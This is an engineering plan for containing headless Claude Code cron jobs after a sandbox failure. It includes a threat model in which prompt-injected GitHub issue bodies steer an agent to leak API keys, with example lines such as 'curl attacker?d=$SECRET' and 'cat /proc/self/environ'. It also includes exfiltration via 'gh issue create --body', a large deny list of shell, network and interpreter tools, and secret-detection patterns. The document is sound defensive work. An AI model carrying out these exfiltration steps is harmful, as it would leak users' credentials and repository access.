---
title: "Re-fix cron bwrap-userns failure — host-independent layered containment (re-scope of #5000/#5004)"
type: fix
date: 2026-06-08
branch: feat-one-shot-5000-5004-cron-sandbox-bwrap-fix
lane: cross-domain
brand_survival_threshold: single-user incident
requires_cpo_signoff: true
cpo_signoff: APPROVE-WITH-CONDITIONS (2026-06-08 — see Domain Review)
supersedes: knowledge-base/project/plans/2026-06-08-fix-cron-bash-sandbox-bwrap-userns-failure-plan.md
status: re-scoped v2 (original BLOCKED P1; this draft hardened against the plan-review panel)
resolves_now: ["#5004"]
defers_to_followup: ["#5000"]
---

# Re-fix cron bwrap-userns failure without the exfil primitive

🐛 **Re-scope (v2, post plan-review panel).** The original plan (shipped as draft PR #5018)
disabled the OS sandbox fleet-wide + `permissions.defaultMode: "bypassPermissions"`. Three
review agents P1-blocked it as a credential-exfil vector; the operator chose **Halt & re-plan**.
This plan replaces the exfil primitive with a **layered, host-independent containment**. A
five-agent plan-review panel (security-sentinel, architecture-strategist, spec-flow-analyzer,
CTO, CPO) then found the first draft's "scoped bash allowlist alone severs the chain" thesis
**still false** (secrets are readable as a *file* via `/proc/self/environ`, and `gh issue create
--body` is an allow-only exfil sink). This v2 folds in every P0/P1 those agents surfaced. Block
record: `knowledge-base/project/specs/feat-one-shot-5000-5004-cron-sandbox-bwrap-fix/review-findings-P1-block.md`.

## Overview

**The availability bug (real, unchanged):** the cron "claude eval substrate" relies on the OS
bash sandbox (bubblewrap) to auto-approve `Bash` tool calls in headless `claude --print` runs.
When the cloud runner's bwrap cannot acquire unprivileged user namespaces (host sysctl
`kernel.apparmor_restrict_unprivileged_userns` drifts 0→1), every `Bash` call fails and the cron
self-reports FAILED (#5000 growth-audit, #5004 roadmap-review). The host-side systemd pin (#4932)
recurred 4 days later for the cron path, so the durable fix removes the cron path's dependency on
unprivileged userns. That decision is retained and confirmed by learning
`2026-06-04-cron-silence-was-bwrap-userns-drift-not-turn-budget.md`.

**Why the obvious fixes fail (panel-verified against Claude Code docs).** Disabling the sandbox
removes the only thing it did for crons: auto-approving headless bash. Two tempting replacements
are both broken for a `single-user incident` threshold:

1. `bypassPermissions` (original plan) auto-approves *everything* → injected content runs
   `curl attacker?d=$SECRET`. P1-blocked.
2. `dontAsk` + a scoped *bash* allowlist (v1 of this plan) is **also insufficient**, because:
   - **Secrets are readable as a FILE.** Claude Code's built-in read-only bash set (`cat`,
     `head`, `grep`, `find`, `ls`) runs **without any prompt in every mode** (docs:
     code.claude.com/docs/en/permissions, "Read-only commands"). `cat /proc/self/environ`
     therefore lands `ANTHROPIC_API_KEY`/`GH_TOKEN` into model context with **no** arbitrary-bash
     needed. A bash *command* allowlist does not stop it.
   - **Egress needs no curl.** `gh issue create --body "$secret"` writes to the **public**
     auto-deploying repo (world-readable); `git config remote.origin.url <attacker>` + `git push
     origin` redirects the authed clone. Every verb is on the allow list — the deny list never
     fires.
   - roadmap-review (the intended #5004 win) **ingests untrusted content** too — anyone can open
     a public GitHub issue whose body carries an injection; its prompt fetches all open issue
     bodies (`cron-roadmap-review.ts:117-118`). So it is in-scope for the threat, not "narrow".

**The fix that actually severs the chain — layered, host-independent, no infra (Tier 1).**
The containment must (a) keep secrets out of model context *and* (b) deny egress, at the
permission + hook layer:

- **L1 — per-producer scoped `--allowedTools`** (the proven prod model: `cron-daily-triage.ts:143`,
  `cron-follow-through-monitor.ts:240` — `Bash(gh issue list:*),…`, curl/dig removed #4068, already
  unsandboxed in prod). No bare `Bash`, no `cat`, no `curl`, no interpreters. Per-cron least
  privilege (NOT a shared union allowlist).
- **L2 — shared `permissions.deny` that overrides the always-on read-only set**: `Read(/proc/**)`,
  `Read(**/.env)`, `Read(~/.aws/**)`, `Read(~/.ssh/**)`, `Read(~/.config/**)`, `Read(~/.netr*)`
  (deny rules apply to `cat`/`head`/`grep`/`find` when the denied path is an argument — docs,
  "Block reads of generated and vendored code") + the egress/interpreter/subshell verb denylist as
  a mode-independent backstop. This is the P0-1 closer.
- **L3 — a `PreToolUse` secret-scan hook** in the ephemeral workspace settings: deny any `Bash`/
  `Write`/`Edit` whose payload contains a secret token shape (`sk-ant-`, `ghs_`/`gho_`/`ghu_`/
  `ghp_`, etc.). Defense-in-depth for the structural `gh issue create --body`/`git push` sinks and
  the "subprocess opens file independently" gap that L2 path-denies cannot cover.
- `sandbox.enabled: false` keeps host-independence (the bug fix). `permissions.defaultMode` set to
  the value that **deterministically fail-closes non-allowlisted commands in headless `--print`**
  — verified PRE-MERGE (Phase 0); `dontAsk` is the documented "auto-deny would-prompt" mode, but
  whether settings.json accepts it (vs. only `default`/`acceptEdits`/`plan`/`bypassPermissions`)
  is unconfirmed and is a Phase-0 gate.

**Tiered scope (operator-confirmed: two PRs).**

- **Tier 1 / THIS PR.** Fixes #5004 and every cron whose bash is a scoped allowlist over
  GitHub/git/read commands, with L1+L2+L3. Broad-skill crons and the 3 crons that `spawn("bash")`
  **outside** claude-code go **fail-closed / contained** and are restored by Tier 2.
- **Tier 2 / FOLLOW-UP ISSUE.** Network-egress firewall (Terraform) + least-privilege installation
  token — the only host-independent containment for crons needing arbitrary `bash <script>` and the
  raw-`spawn("bash")` crons. Restores #5000 + the broad set. Filed, not built here.

## Research Reconciliation — claims vs. codebase reality (incl. plan-review panel)

| Claim | Reality (verified first-hand / by panel) | Plan response |
|---|---|---|
| "21 producers" (orig) / "19 shared" (v1) inherit the overlay | **12** crons spawn claude via the shared substrate AND carry a bare `Bash` token (the D1/D2 blast radius). +3 (`content-publisher`, `content-vendor-drift`, `rule-prune`) `spawn("bash",[script])` at the **Node level, outside claude-code** — D1 does NOT contain them. `skill-freshness` + `workspace-gc` spawn **no** claude. `compound-promote`/`strategy-review` have local setup (verify). | All counts → **12**; AC3 expects 12; the 3 raw-bash crons named explicitly as Tier-2-only (uncontained by L1/L2/L3). |
| roadmap-review (#5004) ingests no untrusted content (v1) | **FALSE** — its prompt fetches every open GitHub issue **body** (`:117-118`); a public repo lets anyone inject. WebSearch/WebFetch are vestigial but irrelevant to the injection surface. | roadmap-review treated as injection-exposed; its Tier-1 safety rests on L2+L3, not "narrow". |
| "scoped bash allowlist keeps secrets out of context" (v1 thesis) | **FALSE** — `cat /proc/self/environ` (built-in read-only, always runs) reads env secrets as a file. | Added L2 `Read(/proc/**)`+secret-file deny (overrides the read-only set) + L3 hook. |
| "deny list is the backstop / covers egress" (v1) | Backstop is **incomplete by design** (blocklist): misses `dig`/`host`/`ftp`/`/dev/tcp`/`awk`/`sed -e`/`find -exec`/`npx`/`docker exec`/`xdg-open`/`osascript`/`base64`/`mkfifo`/`tee`/`dash`/`ksh`/`git -c core.sshCommand`/`gh gist`. | Expand the verb list, but make **L1 allowlist** (exhaustive per-producer) the primary control + L3 hook the real backstop; document deny as best-effort. |
| `dontAsk` works as settings.json `defaultMode` (v1) | Enum value exists in 2.1.142 SDK, but settings.json acceptance is **unverified**; silent-ignore → falls back to `default` → may hang/auto-deny. | PRE-MERGE Phase-0 probe (AC0); pick the mode that fail-closes non-allowlisted in `--print`. |
| `Bash(gh issue:*)` / `Bash(gh api repos/jikig-ai/soleur/:*)` match the prompt | **DOUBTFUL** — prod precedent uses sub-command granularity (`Bash(gh issue list:*)`), and the prompt's `gh api 'repos/jikig-ai/soleur/…'` is **single-quoted** (prefix may not match). | Adopt prod sub-command granularity; add a unit test asserting **each verbatim prompt command** matches an allow pattern (AC4b). |
| roadmap-review is atomically Tier-1 | It **straddles**: issue-half (gh issue create) Tier-1; auto-fix-PR half needs `git branch`/`git switch`/`git push` verbs partly absent → partial run → issue created (monitor GREEN via `resolveOutputAwareOk`, keys on issue existence) while PR silently dropped. | Enumerate ALL prompt git verbs in the allowlist; OR make the prompt fail-loud if a needed verb is denied (AC4c). |
| community-monitor write-token strip (D5) is pure hardening | **FALSE** (CPO) — `community-router.sh:32` detects platform-enabled by token **presence**; the same tokens auth **read** calls. Stripping them silently drops Discord/X/Bsky from the digest (founder-visible regression). | D5 reworked: keep read-auth tokens or split read/write creds; no silent degradation (CPO condition C1/C2). |
| Tier-2 set incl. `workspace-gc` (v1) | `workspace-gc` spawns **no** claude — nothing to fail-closed or restore. | Removed from Tier-2 list. |
| daily-triage/follow-through "unsandboxed from /app = exposure" | They are command-allowlist-**contained** (curl/dig removed #4068) — the *proof* the L1 model works in prod, low exposure. | Separate low-pri audit issue (confirm zero egress verbs), not a high-exposure finding. |

## User-Brand Impact

**If this lands broken, the user experiences:** a non-technical founder's automated growth /
roadmap / community crons silently stop producing their weekly `[Scheduled] …` GitHub issues
(the #5000/#5004 symptom), OR — the mode this plan exists to prevent — a cron's agent, steered
by injected GitHub-issue/web/social content, exfiltrates `ANTHROPIC_API_KEY` (billing abuse) or
the broadly-scoped `GH_TOKEN` (`gh pr merge --auto` on the public auto-deploying repo).

**If this leaks, the user's money / repo / brand is exposed via:** an injected agent reading
`cat /proc/self/environ` and posting it to a public `gh issue create --body`, or `curl
attacker?d=$SECRET` under the original `bypassPermissions`. This re-scope severs both.

**Brand-survival threshold:** `single-user incident`. `requires_cpo_signoff: true`. CPO signed
off APPROVE-WITH-CONDITIONS (Domain Review). `user-impact-reviewer` + `security-sentinel` run at
review time; the L1/L2/L3 layers carry **behavioral** (not string-presence) tests.

## Design

### D0 — Phase-0 pre-merge probes (no code; gating)

- **D0a** `permissions.defaultMode` mode probe: locally run `claude --print --settings <tmp>` with
  a candidate overlay (`dontAsk`, then `default`) + a scoped `--allowedTools`, issuing one
  allowlisted command and one non-allowlisted command; confirm the non-allowlisted command is
  **denied (non-zero / refused), not hung**. Pin the working mode. If neither fail-closes in
  `--print`, escalate (the Tier-1 fix is not shippable as designed).
- **D0b** path-deny probe: confirm `permissions.deny:["Read(/proc/**)"]` actually blocks
  `cat /proc/self/environ` (built-in read-only override).
- **D0c** hook probe: confirm a `PreToolUse` hook (jq decision JSON) denies a `Bash` whose
  `tool_input.command` matches a secret pattern.

### D1 — Substrate: shared deny floor + hook (NOT a shared allowlist)

`_cron-claude-eval-substrate.ts` `DEFAULT_CLAUDE_SETTINGS` (`:141-149`) → carry only the
genuinely fleet-wide floor; the **allow** list lives per-producer in `--allowedTools` (L1):

```jsonc
{
  permissions: {
    defaultMode: "<dontAsk|default — pinned by D0a>",
    allow: [],                              // per-producer via --allowedTools (least privilege)
    deny: [
      // L2 secret-file reads (override the always-on read-only bash set)
      "Read(/proc/**)", "Read(/proc/*/environ)", "Read(**/.env)", "Read(**/.env.*)",
      "Read(~/.aws/**)", "Read(~/.ssh/**)", "Read(~/.config/**)", "Read(~/.netr*)",
      "Read(~/.docker/**)", "Read(/run/secrets/**)",
      // egress / resolvers (best-effort backstop)
      "Bash(curl:*)","Bash(wget:*)","Bash(nc:*)","Bash(ncat:*)","Bash(socat:*)",
      "Bash(telnet:*)","Bash(ssh:*)","Bash(scp:*)","Bash(sftp:*)","Bash(rsync:*)",
      "Bash(dig:*)","Bash(host:*)","Bash(nslookup:*)","Bash(getent:*)","Bash(ftp:*)",
      "Bash(tftp:*)","Bash(httpie:*)","Bash(http:*)","Bash(xh:*)","Bash(aria2c:*)",
      "Bash(links:*)","Bash(lynx:*)","Bash(w3m:*)","Bash(openssl:*)",
      // env / secret dump + gh leak surfaces
      "Bash(env:*)","Bash(printenv:*)","Bash(export:*)","Bash(set:*)",
      "Bash(gh auth:*)","Bash(gh secret:*)","Bash(gh gist:*)",
      // interpreters / system()-hosts (open sockets, read process.env, run inner cmds)
      "Bash(node:*)","Bash(python:*)","Bash(python3:*)","Bash(perl:*)","Bash(ruby:*)",
      "Bash(php:*)","Bash(deno:*)","Bash(bun:*)","Bash(npx:*)","Bash(awk:*)","Bash(gawk:*)",
      "Bash(mawk:*)","Bash(make:*)","Bash(docker:*)","Bash(xdg-open:*)","Bash(open:*)",
      "Bash(osascript:*)","Bash(base64:*)","Bash(xxd:*)","Bash(mkfifo:*)","Bash(dd:*)",
      // arbitrary subshell (defeats command-scoping)
      "Bash(bash:*)","Bash(sh:*)","Bash(dash:*)","Bash(zsh:*)","Bash(ksh:*)","Bash(csh:*)",
      "Bash(tcsh:*)","Bash(fish:*)","Bash(busybox:*)","Bash(eval:*)","Bash(exec:*)",
      "Bash(source:*)","Bash(command:*)","Bash(env -S:*)","Bash(find:* -exec*)",
    ],
  },
  hooks: { PreToolUse: [{ matcher: "Bash|Write|Edit", hooks: [{ type: "command",
    command: "bash plugins/soleur/<path>/cron-secret-scan-hook.sh" }] }] },   // L3
  sandbox: { enabled: false },
}
```

The deny list is **best-effort** (blocklists lag — security-sentinel P1-2); L1 (exhaustive
per-producer allow) + L3 (hook) are the real controls. `git config` is NOT in any allow (P0-2).

### D2 — Per-producer L1 allowlists; drop bare `Bash` (12 substrate-claude crons)

For each of the **12** crons carrying a bare `Bash` token, replace it with a **sub-command-scoped**
allowlist in `--allowedTools` (daily-triage granularity: `Bash(gh issue list:*)`, NOT
`Bash(gh issue:*)`). Narrow crons get a working allowlist; broad-skill crons (need `bash <script>`,
interpreters, `Skill`-spawned hidden bash) get a list that **cannot cover their needs → fail-closed
/ contained** (Tier-2). Re-grep `git grep -nE '(^|[",])Bash([,"])' apps/web-platform/server/inngest/functions/cron-*.ts`
at /work (the v1 `'"Bash,'` grep missed non-first-position `Bash` — spec-flow L1).

### D3 — roadmap-review (#5004): exhaustive, prompt-matched allowlist

`cron-roadmap-review.ts:94-103` `--allowedTools` → drop bare `Bash`, drop vestigial
`WebSearch,WebFetch`, and enumerate **every command the prompt actually runs**, prompt-matched and
tested (AC4b/AC4c). Walking `:112-178`:

- `Bash(gh api repos/jikig-ai/soleur/:*)` — **resolve the single-quote**: the prompt runs
  `gh api 'repos/jikig-ai/soleur/…'`; confirm the matcher strips quotes, else change the prompt to
  unquoted or adjust the pattern (spec-flow C1).
- `Bash(gh issue create:*)`, `Bash(gh issue list:*)`, `Bash(gh issue edit:*)`, `Bash(gh issue close:*)`,
  `Bash(gh issue comment:*)`, `Bash(gh pr list:*)`, `Bash(gh pr create:*)`, `Bash(gh pr comment:*)`.
- git verbs for the auto-fix PR path (spec-flow C2): `Bash(git checkout:*)` (covers `-b`),
  `Bash(git add:*)`, `Bash(git commit:*)`, `Bash(git push:*)` (or pin `origin`; the prompt's push
  form must match — verify), and confirm whether the prompt uses `git branch`/`git switch` (add if
  so). `Read,Write,Edit,Glob,Grep`.
- If ANY needed verb is intentionally withheld, the prompt MUST fail-loud (not silently drop the PR
  half) — `resolveOutputAwareOk` only checks issue existence, so a denied `git push` would leave the
  monitor GREEN with the PR dropped (spec-flow H1). Add a prompt guard or accept-and-document.

### D4 — Validation-driven Tier-1/Tier-2 classification

Apply D1+D2+D3, then `/soleur:trigger-cron` each schedulable producer; classify by whether it
produces its `[Scheduled] …` issue end-to-end. **Confirm, do not assume.** Likely Tier-1:
roadmap-review, agent-native-audit, growth-execution, legal-audit, strategy-review,
compound-promote, rule-prune (verify each spawns claude). Likely Tier-2 (need arbitrary bash /
skills / are raw-`spawn("bash")`): growth-audit #5000, bug-fixer, campaign-calendar,
competitive-analysis, content-generator, seo-aeo-audit, ux-audit, community-monitor (bash),
content-publisher, content-vendor-drift, rule-prune-if-raw-bash. Enumerate the confirmed deferred
set into the Tier-2 issue.

### D5 — community-monitor secret hygiene WITHOUT breaking read-auth (CPO condition)

`cron-community-monitor.ts:230-249`. The 8 tokens are load-bearing for **read** auth
(`community-router.sh:32` detects platforms by token presence). Do NOT silently strip. At /work,
choose: (a) keep the read-required tokens and rely on L1 (no bash posting verbs) + `X_ALLOW_POST`
guards to prevent posting; (b) split read vs write creds per platform if the scripts support it;
or (c) explicitly accept + **surface** the digest degrading to GitHub+HN-only (audit-issue line),
never silent (CPO C1/C2). community-monitor's *bash* containment remains Tier-2.

### D6 — Deferred-cron observability (architecture P1-3 / CTO)

Leaving ~8 broad crons fail-closed-RED until Tier-2 turns their Sentry monitors permanently RED +
emits a weekly FAILED `[Scheduled]` issue. Before merge, for each deferred cron: **pause its
Inngest schedule** (preferred — stops the monitor expecting a check-in) OR mute the Sentry monitor
with a Tier-2 link, AND self-label the fallback audit issue `tier-2-deferred` so a founder can tell
"deferred" from "newly broken".

## Files to Edit (Tier-1 / this PR)

- `apps/web-platform/server/inngest/functions/_cron-claude-eval-substrate.ts` — D1 (deny floor + hook + mode + comment rewrite removing all `bypassPermissions` rationale).
- `apps/web-platform/server/inngest/functions/cron-roadmap-review.ts` — D3.
- `apps/web-platform/server/inngest/functions/cron-community-monitor.ts` — D5 + D2.
- The other 11 substrate-claude crons with a bare `Bash` token — D2 (per-producer scoped allow). Re-grep at /work; expected count **12** total (AC3).
- `plugins/soleur/<scripts path>/cron-secret-scan-hook.sh` — **new** L3 PreToolUse hook (secret-pattern deny). [path chosen at /work under plugins/soleur]
- `apps/web-platform/test/server/inngest/cron-claude-eval-substrate.test.ts` — rewrite the `DEFAULT_CLAUDE_SETTINGS` block (`:64-105` currently asserts `bypassPermissions`) to assert the D1 floor + the BEHAVIORAL deny tests (AC2b/AC4b).
- Per-cron tests asserting `--allowedTools` (re-grep all `cron-*.test.ts`).
- Inngest schedule / Sentry-monitor config for the deferred set — D6.
- `knowledge-base/engineering/operations/runbooks/cloud-scheduled-tasks.md` — host-independent containment model; #4932/#4944 = non-cron defense-in-depth; Tier-2 deferral + deferred-monitor handling.
- `knowledge-base/engineering/architecture/decisions/ADR-033-inngest-cron-functions-invoke-claude-code-via-child-process-spawn.md` — amend with **I7** (containment = `sandbox:false` + per-cron scoped `--allowedTools` + shared secret-file/egress deny + PreToolUse secret-scan hook; crons that `spawn("bash")` outside claude-code are NOT covered and need Tier-2 egress firewall).

## Files to Create

- `plugins/soleur/<path>/cron-secret-scan-hook.sh` (L3 hook; above).
- `knowledge-base/project/learnings/integration-issues/<topic>.md` — host-independent cron containment is layered (L1 scoped allow + L2 `/proc`/secret-file deny + L3 hook); `cat /proc/self/environ` defeats a bash-only allowlist; built-in read-only bash always runs unless deny-overridden; daily-triage is the prod precedent. (Date at write-time.)

## Open Code-Review Overlap

Checked 5 planned-edit files vs. 63 open `code-review` issues — only `github-app.ts` matched
(#2246, unrelated KB-polish), and `github-app.ts` is a **Tier-2** file (not edited here).
**Disposition: acknowledge** — no Tier-1 overlap; #2246 stays open.

## Acceptance Criteria

### Pre-merge (PR)

- [ ] **AC0 (gating)** — D0a/D0b/D0c probes pass and the working `defaultMode` is pinned; evidence (command + output) pasted into the PR description.
- [ ] AC1 — `DEFAULT_CLAUDE_SETTINGS` parsed JSON: `defaultMode` === the D0a-pinned value; `sandbox.enabled === false`; `deny` contains every `Read(/proc/**)`/secret-file rule AND the egress/interpreter/subshell verbs; `hooks.PreToolUse` references the L3 hook; `allow === []`. The token `"bypassPermissions"` appears nowhere as a JSON value (comment prose may reference it historically — scope the check to the parsed value, not file bytes — spec-flow L2).
- [ ] **AC2b (behavioral)** — a real `claude --print` spawn with the overlay + a scoped `--allowedTools`: `cat /proc/self/environ` is **denied** (asserts L2); `curl http://example.com` is **denied** (asserts deny); a secret-shaped `echo "ghs_…"` Bash is **denied by the L3 hook**. Assert exit/refusal, not string presence.
- [ ] AC3 — `git grep -nE '(^|[",])Bash([,"])' apps/web-platform/server/inngest/functions/cron-*.ts` returns **0** (no shared producer passes bare `Bash`); the expected substrate-claude count is **12**.
- [ ] **AC4b** — unit test over roadmap-review's verbatim prompt commands: each `gh …`/`git …` invocation matches a `--allowedTools` allow pattern (no LLM). Includes the single-quoted `gh api 'repos/jikig-ai/soleur/…'` form.
- [ ] **AC4c** — roadmap-review either allows every git verb its prompt needs (branch/checkout/push form), or the prompt fails-loud on a denied verb (no GREEN-monitor partial run).
- [ ] AC5 — community-monitor `buildSpawnEnv` keeps `ANTHROPIC_API_KEY`+`GH_TOKEN` (assert PRESENT) and the read-auth tokens the router needs (per D5 choice); any platform it disables is surfaced, not silent (assert the degradation note path exists).
- [ ] AC6 — `vitest run apps/web-platform/test/server/inngest/` green; `cd apps/web-platform && ./node_modules/.bin/tsc --noEmit` clean (NOT `npm run -w`); `scripts/test-all.sh` green (orphan suites incl. any cron/byok sweep).
- [ ] AC7 — repo-root `.claude/settings.json` UNCHANGED (`git diff --name-only origin/main..HEAD` must not list it).
- [ ] AC8 — the 3 raw-`spawn("bash")` crons (`content-publisher`, `content-vendor-drift`, `rule-prune`) are named in the Tier-2 issue as **uncontained by L1/L2/L3** (firewall is their only containment).
- [ ] AC9 — D6 applied: deferred-set Inngest schedules paused OR monitors muted-with-link; FAILED audit issues self-label `tier-2-deferred`.
- [ ] AC10 — PR body uses `Ref #5000` and `Ref #5004` (NOT `Closes`); Tier-2 + daily-triage-audit follow-up issue numbers linked.

### Post-merge (operator-automatable; no SSH)

- [ ] AC11 — deploy lands (`web-platform-release.yml`). `/soleur:trigger-cron` → `cron/roadmap-review.manual-trigger`; confirm a `[Scheduled] Weekly Roadmap Review …` issue is produced end-to-end → `gh issue close 5004` with a comment linking the PR. (If no issue → the allowlist/quoting mismatch (AC4b) regressed; fix forward, do not close.) (#5004 RESOLVED.)
- [ ] AC12 — D4 trigger-cron validation across Tier-1 candidates; record pass/fail per cron in the Tier-2 issue.
- [ ] AC13 — confirm #5000 self-reports FAILED-contained (not silent), labeled `tier-2-deferred`, left OPEN.

## Observability

```yaml
liveness_signal:
  what: per-cron Sentry check-in (postSentryHeartbeat) + output-aware verify-output step
  cadence: each cron's schedule (roadmap-review Mon 09:00 UTC) + manual-trigger; deferred set paused (D6)
  alert_target: Sentry cron monitors (scheduled-roadmap-review, …)
  configured_in: cron-*.ts verify-output/sentry-heartbeat; infra/sentry/cron-monitors.tf
error_reporting:
  destination: Sentry via reportSilentFallback; stderrTail/stdoutTail in scheduled-output-missing extra
  fail_loud: true — denials surface as non-zero exit → output-missing → ensureScheduledAuditIssue FAILED (#4978/#4988)
failure_modes:
  - {mode: cron bash/secret-read denied (Tier-2 contained), detection: output-missing + FAILED issue (tier-2-deferred), alert_route: Sentry RED + GitHub issue}
  - {mode: regression to bypassPermissions/sandbox-on/bare-Bash, detection: AC1/AC2b/AC3 tests, alert_route: CI red pre-merge}
  - {mode: roadmap-review allowlist/quote mismatch denies gh api, detection: AC4b unit + AC11 trigger-cron, alert_route: no scheduled-roadmap-review issue}
  - {mode: roadmap-review PARTIAL run (issue created, PR dropped), detection: AC4c, alert_route: prompt fail-loud (else silent — H1)}
logs:
  where: Sentry (tails); pino line stream to app stdout (NOT shipped to Better Stack — tails are the warehouse path)
  retention: Sentry default
discoverability_test:
  command: "gh issue list --label scheduled-roadmap-review --state open --search 'in:title Weekly Roadmap Review' --json number,createdAt   # after AC11; NO ssh"
  expected_output: a fresh issue created within the trigger window
```

## Domain Review

**Domains relevant:** Engineering (CTO + architecture-strategist), Product (CPO sign-off — threshold gate), Security (security-sentinel), Flow (spec-flow-analyzer). Not a UI feature → Product/UX Gate = **NONE** (no wireframes); CPO sign-off required by threshold.

### Engineering — CTO
**Status:** reviewed. Phasing (Tier-1 permission containment now, Tier-2 egress firewall later) **approved** as the correct monotonic-blast-radius sequence. Keep the sweep in **one PR but re-scope to 12 files** (a 17–19 claim over a 12-file reality trips the incomplete-sweep alarm). `workspace-gc` mis-listed (no claude spawn) — removed. Confirm `dontAsk` works as `defaultMode` before /work (AC0). I7 routed to ADR amendment (no new ADR needed for Tier-1; Tier-2 firewall will need its own).

### Engineering — architecture-strategist
**Status:** reviewed. P0: "19 shared producers" model wrong → **12** reach D1; 3 raw-`spawn("bash")` crons are outside claude-code entirely (AC8). P0: verify `dontAsk` settings.json acceptance pre-merge (AC0). P1: prefer **per-producer scoped `--allowedTools`** over a shared union allowlist (least privilege; the proven daily-triage model) — **adopted** (D1 carries only the deny floor; allow is per-producer). P1: no gradual rollout — flipping the shared substrate flips all 12 at once; mitigated by AC0 pre-merge probe + D4 + roadmap-review being the validated lead. P1: I7 must scope to claude-code crons only. P1-3: deferred-monitor RED handled by D6.

### Security — security-sentinel
**Status:** reviewed. **The v1 design did NOT sever the chain** — two P0s now folded in: P0-1 `cat /proc/self/environ` (→ L2 `Read(/proc/**)`+secret-file deny); P0-2 allow-only exfil via `git config`+`git push`/`gh issue create --body` on the public repo (→ drop `git config` from allow + L3 PreToolUse secret-scan hook; secrets kept out of context by L2). P1: deny list incomplete (expanded in D1; documented best-effort). P1: roadmap-review ingests untrusted GitHub issue bodies (threat-modeled). Net: the **load-bearing controls are L2 (secret never enters context) + L3 (hook), not the verb deny list**. Residual P2: `Skill`/`Task`/MCP (Playwright) tool classes — verify they inherit the settings deny at /work; treat any Tier-1 cron retaining WebFetch/MCP as egress-capable.

### Flow — spec-flow-analyzer
**Status:** reviewed. CRITICAL C1: `Bash(gh issue:*)` coarser than prod `Bash(gh issue list:*)` AND the `gh api 'repos/…'` single-quote may not match → #5004 silently unfixed (→ AC4b prompt-command match test, pre-merge). C2/H1: roadmap-review straddles Tier-1/Tier-2; partial run (issue created, PR dropped) goes GREEN because `resolveOutputAwareOk` keys only on issue existence (→ AC4c fail-loud). H2: no behavioral deny test (→ AC2b). L1: AC3 grep weak (`'"Bash,'` misses non-first `Bash`) → strengthened. L2: AC1 "bypassPermissions nowhere in file" over-constrains the comment → scoped to JSON value.

### Product/UX Gate — CPO
**Tier:** N/A (no UI surface). **Decision:** **APPROVE-WITH-CONDITIONS.** User-Brand Impact is concrete (not boilerplate); two-PR scoping is the correct brand call (defer-contained beats restore-exposed). **Conditions (pre-merge):** C1 — D5 must not silently break community-monitor read-auth (router detects platforms by token presence); C2 — any platform degradation must surface (no silent green); C3 — defer-tracking integrity (#5000 OPEN, Tier-2 filed, `Ref` not `Closes`). All three encoded (D5, AC5, AC10/AC13).
**Agents invoked:** cpo, spec-flow-analyzer, cto, security-sentinel, architecture-strategist. **Skipped specialists:** none. **Pencil available:** N/A (no UI surface).

## Phases (TDD)

- **Phase 0 — gating probes (no code):** D0a/D0b/D0c (AC0); re-grep the 12 bare-`Bash` producers; classify the 3 raw-`spawn("bash")` crons; inventory `cron-*.test.ts` allowedTools assertions.
- **Phase 1 — RED:** rewrite substrate test (D1 floor + AC2b behavioral denies + AC4b prompt-match); community-monitor env test (AC5); strengthened bare-`Bash` grep test (AC3). Confirm RED.
- **Phase 2 — GREEN:** L3 hook; D1 substrate; D3 roadmap-review; D2 fleet (12); D5 community-monitor; D6 deferred-monitor handling; per-cron test updates. `tsc`/vitest/test-all green.
- **Phase 3 — docs:** runbook + ADR-033 I7 + learning.
- **Phase 4 — follow-up issues:** Tier-2 (egress firewall + least-priv token + restore broad set incl. #5000 + the 3 raw-bash crons); daily-triage/follow-through allowlist-audit (low-pri).
- **Phase 5 — post-merge:** AC11–AC13.

## Alternative Approaches Considered

| Approach | Why not (now) |
|---|---|
| Fleet-wide `bypassPermissions` (original) | P1-blocked exfil primitive. |
| `dontAsk` + bash-only allowlist (v1 of this plan) | Insufficient: `cat /proc/self/environ` + `gh issue create --body` exfil with only allowed/read-only verbs. Hardened to L1+L2+L3. |
| Shared union allowlist in settings | Over-grants every cron the union surface; per-producer scoped `--allowedTools` (daily-triage) is least-privilege. Adopted. |
| Generous allowlist incl. `bash <script>` for broad crons now | Re-admits exfil (write-then-exec/chaining) — violates "no exfil primitive". |
| Host-side durable userns pin only | #4932 systemd pin recurred 4 days later for the cron path; kept as non-cron defense-in-depth. |
| Egress firewall now (one PR) | Operator chose two-PR; infra blast radius → Tier-2 PR. **Tracked (Phase 4).** |
| Dispatch broad crons back to GHA runners | Reverses the recent TR9 Inngest migration. Noted as a Tier-2 option. **Tracked.** |

## Deferred → tracking issues (file in Phase 4)

1. **Tier-2 — egress firewall + least-privilege token + restore broad/raw-bash crons** (`type/security`): network-egress allowlist on the cron worker (Terraform; api.anthropic.com + api.github.com + community-monitor read APIs only); narrow `generateInstallationToken` (`github-app.ts:594`) to per-cron least-privilege; restore growth-audit #5000, bug-fixer, campaign-calendar, competitive-analysis, content-generator, seo-aeo-audit, ux-audit, community-monitor (bash), and the 3 raw-`spawn("bash")` crons (content-publisher, content-vendor-drift, rule-prune) to working+contained. Final set from D4. **Note:** the firewall does NOT stop `gh issue create --body $secret` to the public repo (github is an allowed destination) — the L2/L3 layers remain load-bearing even after Tier-2.
2. **Audit daily-triage / follow-through-monitor allowlists** (`type/security`, low-pri): confirm zero egress verbs; document as the canonical contained-unsandboxed-from-`/app` pattern.

## Sharp Edges

- **`cat /proc/self/environ` is the real exfil source, not `echo $X`.** Built-in read-only bash runs in every mode; only a `Read(/proc/**)`/secret-file **deny** stops it. The `Read`-tool path must be denied too. Verify the deny actually fires (AC2b) — path-denies do NOT cover subprocesses that open files independently (interpreters are separately denied; L3 hook is the backstop).
- **Allow-only exfil needs no curl.** `gh issue create --body` / `git push origin` are structural sinks on the public repo. The deny list cannot cover them; the defense is keeping secrets out of context (L2) + the secret-scan hook (L3). Do not sell the verb-deny list as containment.
- **`gh api 'repos/jikig-ai/soleur/…'` is single-quoted** — confirm the matcher strips quotes or the repo-scoped allow never matches and #5004 stays broken (AC4b).
- **Use prod sub-command granularity** (`Bash(gh issue list:*)`), not `Bash(gh issue:*)` — the prod crons enumerate verbs deliberately; verify the coarse form before relying on it.
- **roadmap-review partial-run is GREEN-silent** — `resolveOutputAwareOk` keys on issue existence, so a denied `git push` drops the PR while the monitor stays green (AC4c).
- **Blast radius is 12, not 19** — and 3 crons `spawn("bash")` outside claude-code (uncontained by L1/L2/L3 — AC8). Re-grep; do not trust prose counts.
- **`dontAsk` settings.json acceptance is unverified** — gate on AC0 before building.
- **D5 tokens are read-auth, not just write** — stripping them silently degrades the digest (CPO C1/C2).
- **`Skill`/`Task`/MCP tools** may run hidden bash / egress outside the per-command deny — verify inheritance at /work (security-sentinel P2-1).
